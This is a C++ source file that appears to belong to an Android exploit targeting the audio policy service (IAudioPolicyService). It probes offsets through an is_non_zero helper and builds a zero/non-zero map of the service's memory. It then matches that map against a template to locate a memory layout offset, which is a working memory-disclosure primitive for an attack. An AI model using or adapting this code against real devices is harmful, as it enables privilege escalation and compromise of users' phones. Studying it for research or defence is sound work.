#include "memory_map.h"
#include "primitives.h"

namespace android {

void print_memory_map(const unsigned char* map, int size) {
	for (int i=0; i<size; i++) {
	printf(map[i] == ZERO ? "0": "1");
		if ((i+1) % MEMORY_MAP_ROW_LEN == 0)
			printf("\n");
	}
	printf("\n");
}

int find_memory_map(const sp<IAudioPolicyService>& service, const unsigned char* template_map, uint32_t template_map_size, int start_offset, int end_offset, int& match_offset) {

	//Allocating the temporary memory map
	int size_of_map = start_offset - end_offset + 1;
	unsigned char* memory_map = (unsigned char*)malloc(size_of_map);
	memset(memory_map, 0, size_of_map);

	//Populating the temporary memory map
	for (int i=start_offset; i>=end_offset; i--) {
		bool non_zero = is_non_zero(service, i);
		memory_map[size_of_map+i-start_offset-1] = non_zero ? NOT_ZERO : ZERO;
	}

	//Printing some debug information
	printf("Looking for template:\n");
	print_memory_map(template_map, template_map_size);
	printf("Got memory map:\n");
	print_memory_map(memory_map, size_of_map);

	//Looking for a match
	void* match = memmem(memory_map, size_of_map, template_map, template_map_size);
	if (match == NULL) {
	free(memory_map);
		return -ENOENT;
	}
	match_offset = (int)((uint32_t)match - (uint32_t)memory_map - size_of_map);
	free(memory_map);
	return 0;
}

}
